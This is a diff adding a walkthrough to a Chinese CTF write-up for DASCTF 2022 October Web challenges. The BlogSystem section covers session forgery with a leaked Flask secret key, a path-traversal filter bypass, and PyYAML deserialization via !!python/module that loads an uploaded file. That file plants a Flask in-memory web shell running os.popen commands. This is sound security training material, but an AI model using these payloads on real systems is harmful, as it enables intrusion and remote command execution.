@@ -1,7 +1,7 @@
 ---
-title: "DASCTF 2022 十月赛 Web 部分 Writeup"
+title: "DASCTF 2022 十月赛 Web Writeup"
 date: 2022-10-24T15:02:34+08:00
-lastmod: 2022-10-28T15:02:34+08:00
+lastmod: 2022-10-31T15:02:34+08:00
 draft: false
 author: "X1r0z"
 
@@ -557,6 +557,420 @@ date -f /hereisflag/flllll111aaagg
 
 ![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231839756.png)
 
+## BlogSystem[复现]
+
+随便注册一个用户
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210311601414.png)
+
+点 blog 查看文章
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210311602854.png)
+
+点开最后一篇 `flask 基础总结`
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210311603552.png)
+
+伪造 session 的 secret_key 在这里面, 只能说出题人脑洞是真的大...
+
+之后伪造用户为 admin
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210311605528.png)
+
+刷新网页后多了 download 选项
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210311606108.png)
+
+存在任意文件读取
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210311607555.png)
+
+发现会将 `..` 和 `//` 替换成空, 用如图的 payload 绕过
+
+下面读取相关源码
+
+```
+.//././/./app.py
+.//././/./view/index.py
+.//././/./view/blog.py
+.//././/./requirements.txt
+```
+
+app.py (从开头很容易就能推出来 view 目录下源码对应的文件名)
+
+```python
+from flask import *
+import config
+
+app = Flask(__name__)
+app.config.from_object(config)
+app.secret_key = '7his_1s_my_fav0rite_ke7'
+from model import *
+from view import *
+
+app.register_blueprint(index, name='index')
+app.register_blueprint(blog, name='blog')
+
+
+@app.context_processor
+def login_statue():
+    username = session.get('username')
+    if username:
+        try:
+            user = User.query.filter(User.username == username).first()
+            if user:
+                return {"username": username, 'name': user.name, 'password': user.password}
+        except Exception as e:
+            return e
+    return {}
+
+
+@app.errorhandler(404)
+def page_not_found(e):
+    return render_template('404.html'), 404
+
+
+@app.errorhandler(500)
+def internal_server_error(e):
+    return render_template('500.html'), 500
+
+
+if __name__ == '__main__':
+    app.run('0.0.0.0', 80)
+```
+
+view/index.py
+
+```python
+from flask import Blueprint, session, render_template, request, flash, redirect, url_for, Response, send_file
+from werkzeug.security import check_password_hash
+from decorators import login_limit, admin_limit
+from model import *
+import os
+
+index = Blueprint("index", __name__)
+
+
+@index.route('/')
+def hello():
+    return render_template('index.html')
+
+
+@index.route('/register', methods=['POST', 'GET'])
+def register():
+    if request.method == 'GET':
+        return render_template('register.html')
+    if request.method == 'POST':
+        name = request.form.get('name')
+        username = request.form.get('username')
+        password = request.form.get('password')
+        user = User.query.filter(User.username == username).first()
+        if user is not None:
+            flash("该用户名已存在")
+            return render_template('register.html')
+        else:
+            user = User(username=username, name=name)
+            user.password_hash(password)
+            db.session.add(user)
+            db.session.commit()
+            flash("注册成功！")
+            return render_template('register.html')
+
+
+@index.route('/login', methods=['POST', 'GET'])
+def login():
+    if request.method == 'GET':
+        return render_template('login.html')
+    if request.method == 'POST':
+        username = request.form.get('username')
+        password = request.form.get('password')
+        user = User.query.filter(User.username == username).first()
+        if (user is not None) and (check_password_hash(user.password, password)):
+            session['username'] = user.username
+            session.permanent = True
+            return redirect(url_for('index.hello'))
+        else:
+            flash("账号或密码错误")
+            return render_template('login.html')
+
+
+@index.route("/updatePwd", methods=['POST', 'GET'])
+@login_limit
+def update():
+    if request.method == "GET":
+        return render_template("updatePwd.html")
+    if request.method == 'POST':
+        lodPwd = request.form.get("lodPwd")
+        newPwd1 = request.form.get("newPwd1")
+        newPwd2 = request.form.get("newPwd2")
+        username = session.get("username")
+        user = User.query.filter(User.username == username).first()
+        if check_password_hash(user.password, lodPwd):
+            if newPwd1 != newPwd2:
+                flash("两次新密码不一致！")
+                return render_template("updatePwd.html")
+            else:
+                user.password_hash(newPwd2)
+                db.session.commit()
+                flash("修改成功！")
+                return render_template("updatePwd.html")
+        else:
+            flash("原密码错误！")
+            return render_template("updatePwd.html")
+
+
+@index.route('/download', methods=['GET'])
+@admin_limit
+def download():
+    if request.args.get('path'):
+        path = request.args.get('path').replace('..', '').replace('//', '')
+        path = os.path.join('static/upload/', path)
+        if os.path.exists(path):
+            return send_file(path)
+        else:
+            return render_template('404.html', file=path)
+    return render_template('sayings.html',
+                           yaml='所谓『恶』，是那些只为了自己，利用和践踏弱者的家伙！但是，我虽然是这样，也知道什么是令人作呕的『恶』，所以，由我来制裁！')
+
+
+@index.route('/logout')
+def logout():
+    session.clear()
+    return redirect(url_for('index.hello'))
+```
+
+view/blog.py
+
+```python
+import os
+import random
+import re
+import time
+
+import yaml
+from flask import Blueprint, render_template, request, session
+from yaml import Loader
+
+from decorators import login_limit, admin_limit
+from model import *
+
+blog = Blueprint("blog", __name__, url_prefix="/blog")
+
+
+def waf(data):
+    if re.search(r'apply|process|eval|os|tuple|popen|frozenset|bytes|type|staticmethod|\(|\)', str(data), re.M | re.I):
+        return False
+    else:
+        return True
+
+
+@blog.route('/writeBlog', methods=['POST', 'GET'])
+@login_limit
+def writeblog():
+    if request.method == 'GET':
+        return render_template('writeBlog.html')
+    if request.method == 'POST':
+        title = request.form.get("title")
+        text = request.form.get("text")
+        username = session.get('username')
+        create_time = time.strftime("%Y-%m-%d %H:%M:%S")
+        user = User.query.filter(User.username == username).first()
+        blog = Blog(title=title, text=text, create_time=create_time, user_id=user.id)
+        db.session.add(blog)
+        db.session.commit()
+        blog = Blog.query.filter(Blog.create_time == create_time).first()
+        return render_template('blogSuccess.html', title=title, id=blog.id)
+
+
+@blog.route('/imgUpload', methods=['POST'])
+@login_limit
+def imgUpload():
+    try:
+        file = request.files.get('editormd-image-file')
+        fileName = file.filename.replace('..','')
+        filePath = os.path.join("static/upload/", fileName)
+        file.save(filePath)
+        return {
+            'success': 1,
+            'message': '上传成功!',
+            'url': "/" + filePath
+        }
+    except Exception as e:
+        return {
+            'success': 0,
+            'message': '上传失败'
+        }
+
+
+@blog.route('/showBlog/<id>')
+def showBlog(id):
+    blog = Blog.query.filter(Blog.id == id).first()
+    comment = Comment.query.filter(Comment.blog_id == blog.id)
+    return render_template("showBlog.html", blog=blog, comment=comment)
+
+
+@blog.route("/blogAll")
+def blogAll():
+    blogList = Blog.query.order_by(Blog.create_time.desc()).all()
+    return render_template('blogAll.html', blogList=blogList)
+
+
+@blog.route("/update/<id>", methods=['POST', 'GET'])
+@login_limit
+def update(id):
+    if request.method == 'GET':
+        blog = Blog.query.filter(Blog.id == id).first()
+        return render_template('updateBlog.html', blog=blog)
+    if request.method == 'POST':
+        id = request.form.get("id")
+        title = request.form.get("title")
+        text = request.form.get("text")
+        blog = Blog.query.filter(Blog.id == id).first()
+        blog.title = title
+        blog.text = text
+        db.session.commit()
+        return render_template('blogSuccess.html', title=title, id=id)
+
+
+@blog.route("/delete/<id>")
+@login_limit
+def delete(id):
+    blog = Blog.query.filter(Blog.id == id).first()
+    db.session.delete(blog)
+    db.session.commit()
+    return {
+        'state': True,
+        'msg': "删除成功！"
+    }
+
+
+@blog.route("/myBlog")
+@login_limit
+def myBlog():
+    username = session.get('username')
+    user = User.query.filter(User.username == username).first()
+    blogList = Blog.query.filter(Blog.user_id == user.id).order_by(Blog.create_time.desc()).all()
+    return render_template("myBlog.html", blogList=blogList)
+
+
+@blog.route("/comment", methods=['POST'])
+@login_limit
+def comment():
+    text = request.values.get('text')
+    blogId = request.values.get('blogId')
+    username = session.get('username')
+    create_time = time.strftime("%Y-%m-%d %H:%M:%S")
+    user = User.query.filter(User.username == username).first()
+    comment = Comment(text=text, create_time=create_time, blog_id=blogId, user_id=user.id)
+    db.session.add(comment)
+    db.session.commit()
+    return {
+        'success': True,
+        'message': '评论成功！',
+    }
+
+
+@blog.route('/myComment')
+@login_limit
+def myComment():
+    username = session.get('username')
+    user = User.query.filter(User.username == username).first()
+    commentList = Comment.query.filter(Comment.user_id == user.id).order_by(Comment.create_time.desc()).all()
+    return render_template("myComment.html", commentList=commentList)
+
+
+@blog.route('/deleteCom/<id>')
+def deleteCom(id):
+    com = Comment.query.filter(Comment.id == id).first()
+    db.session.delete(com)
+    db.session.commit()
+    return {
+        'state': True,
+        'msg': "删除成功！"
+    }
+
+
+@blog.route('/saying', methods=['GET'])
+@admin_limit
+def Saying():
+    if request.args.get('path'):
+        file = request.args.get('path').replace('../', 'hack').replace('..\\', 'hack')
+        try:
+            with open(file, 'rb') as f:
+                f = f.read()
+                if waf(f):
+                    print(yaml.load(f, Loader=Loader))
+                    return render_template('sayings.html', yaml='鲁迅说：当你看到这句话时，还没有拿到flag，那就赶紧重开环境吧')
+                else:
+                    return render_template('sayings.html', yaml='鲁迅说：你说得不对')
+        except Exception as e:
+            return render_template('sayings.html', yaml='鲁迅说：'+str(e))
+    else:
+
+        with open('view/jojo.yaml', 'r', encoding='utf-8') as f:
+            sayings = yaml.load(f, Loader=Loader)
+            saying = random.choice(sayings)
+            return render_template('sayings.html', yaml=saying)
+```
+
+requirements.txt
+
+```
+PyYAML~=6.0
+Flask==2.0.2
+Werkzeug~=2.2.2
+SQLAlchemy~=1.4.41
+flask_sqlalchemy~=2.5.1
+PyMySQL~=1.0.2
+```
+
+/saying 路由存在 PyYAML 反序列化, 并且有 waf 过滤
+
+参考文章 [https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml](https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml)
+
+大多数关键词都被过滤了, 虽然可以用 `python/object/new` 导入模块, 但是过滤了 os 和 subprocess, 并且也用不了 builtins (tuple 被过滤)
+
+```python
+!!python/object/new:time.sleep
+- 5
+```
+
+然后又看到了 ` python/module`, 并且刚好 writeblog 的时候可以上传文件, 于是猜测是要利用该标签导入模块来执行 python 代码
+
+模块利用的是 /static/upload 目录, payload 如下
+
+```python
+!!python/module:static.upload
+```
+
+这里好像只能通过 `__init__.py` 来执行, 不能写成 `static.upload!exp` (static 目录下没有 `__init__.py` ?)
+
+注意模块只能导入一次, 即 `__init__.py` 中的代码只能执行一次, 否则只能重开环境, 所以考虑使用 flask 内存马
+
+参考文章 [https://xz.aliyun.com/t/10933](https://xz.aliyun.com/t/10933)
+
+```python
+from flask import *
+
+url_for.__globals__['__builtins__']['eval']("app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())",{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']})
+```
+
+最后依次上传对应文件, 访问 /saying 传参 path 来反序列化 yaml
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210311621253.png)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210311621759.png)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210311621319.png)
+
+访问 /shell 执行命令
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210311622751.png)
+
+查看 flag
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210311622264.png)
+
 ## 补充
 
 easypop 环境有问题, 预期解的方法是利用 fast destruct
@@ -565,7 +979,7 @@ easypop 环境有问题, 预期解的方法是利用 fast destruct
 
 EasyLove 那步能出来 hint 的原因是 payload 中有 `%0a`, 不过具体原理是啥还不太清楚... 其实应该用 php://filter, 只是需要注意绝对路径, 当时没反应过来
 
-BlogSystem 的 secret key 藏在文章里我是真的没想到, 伪造 session 之后就是常规任意文件读取 + pyyaml 反序列化 (参考网鼎杯青龙组那道题)
+BlogSystem 的 secret key 藏在文章里我是真的没想到, 伪造 session 之后就是任意文件读取 + pyyaml 反序列化
 
 最后 hade_waibo 的预期解简单说一下
 
@@ -690,8 +1104,10 @@ unserialize(serialize($user));
 
 ![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210281827223.png)
 
-wp 中通过 `* /*` 查看 flag, `*` 会依照顺序将当前目录下的某个文件作为命令来执行, 并将剩余文件名作为参数 (参考 n 字节限制下的命令执行)
+wp 中通过 `* /*` 查看 flag, `*` 会依照 ascii 码顺序将当前目录下的某个文件作为命令来执行, 并将剩余文件名作为参数 (参考 n 字节限制下的命令执行)
 
 执行之前创建了 cat 文件, 这一步的利用方法就不写了, 就是通过 User 类的 \_\_wakeup 或者 \_\_destruct 来触发 Test 类的 \_\_toString 方法
+
+很巧的是创建的 cat 文件第一个字母是 c, 而上传文件时保存图片的文件名是 `dasctf + md5 + 后缀`, dasctf 首字母是 d, 这样就确保了 `*` 匹配到作为命令的文件名一定是 cat
 
 [官方 writeup](https://pan.baidu.com/s/1WpKBYZ5kAYPbdSapciDk_Q?pwd=DAS1)
